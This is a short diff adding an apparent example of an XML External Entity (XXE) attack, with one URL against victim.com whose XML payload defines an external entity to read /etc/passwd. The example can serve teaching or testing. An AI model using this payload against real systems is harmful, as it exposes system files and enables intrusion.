@@ -1,0 +1,5 @@
+Example of XML External Entity (XXE) attack:
+
+1. To display /etc/passwd
+
+http://victim.com/?xml=<!DOCTYPE test [<!ENTITY x SYSTEM "file:///etc/passwd">]><test>%26x;</test>
